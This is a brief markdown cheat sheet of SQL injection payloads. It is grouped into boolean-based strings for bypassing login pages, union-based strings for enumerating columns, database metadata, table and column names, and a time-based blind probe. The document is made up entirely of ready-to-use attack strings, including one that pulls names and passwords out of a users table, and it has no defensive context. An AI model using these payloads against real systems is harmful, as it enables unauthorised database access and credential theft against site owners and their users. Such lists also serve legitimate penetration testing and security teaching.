# SQLi-pattern

Boolean-based (Login page):

---

```sh
' or '1'='1  
') or 1=('1  
') or 1=('1')-- -  
") or 1=("1  
") or 1=("1")-- -  
' or '1'='1'#  
```

Union-based (URL String):

---

```sh
' AND 1='1  
' AND 1='2  
' ORDER BY 8 -- '
' UNION SELECT 1, 2, 3, 4, 5, 6, 7, 8 -- '
' UNION SELECT 1, 2, 3, 4, 5, 6, 7, 8 LIMIT 1, 1 -- '
' UNION SELECT database(),version(),user(),4,5,6,7,8 LIMIT 1,1 --+
' UNION SELECT group_concat(table_name,0x0a),2,3,4,5,6,7,8 from information_schema.tables where table_schema=database() LIMIT 1,1 --+
' UNION SELECT group_concat(column_name,0x0a),2,3,4,5,6,7,8 from information_schema.columns where table_name='users' LIMIT 1,1 --+
' UNION SELECT group_concat(name,0x0a,password),2,3,4,5,6,7,8 from users LIMIT 1,1 --+
```

Time-based:

---

```sh
and if(length(database())=4,sleep(5),1) #
```
